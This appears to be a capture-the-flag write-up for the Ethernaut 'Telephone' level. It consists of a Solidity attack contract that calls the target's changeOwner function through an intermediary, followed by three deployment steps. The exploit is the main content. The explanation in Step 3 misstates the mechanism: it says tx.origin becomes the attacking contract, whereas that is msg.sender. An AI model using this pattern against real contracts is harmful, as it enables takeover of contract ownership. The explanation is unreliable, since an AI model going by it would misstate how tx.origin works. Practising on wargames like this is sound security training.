```shell
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneAttack {

  Telephone telephoneContract;

    constructor(address _address) public {
        telephoneContract = Telephone(_address);
    }

    function attack(address _address) public {
        telephoneContract.changeOwner(_address);
    }
}
```
## Hack: 

Step1:

Deploy w/ ethernaut contract instance address as constructor arg.

Step2:

Call attack function w/ wallet as address.

Step3:

Attack will succeed because tx.origin will be attacking contract address rather than wallet that will take ownership.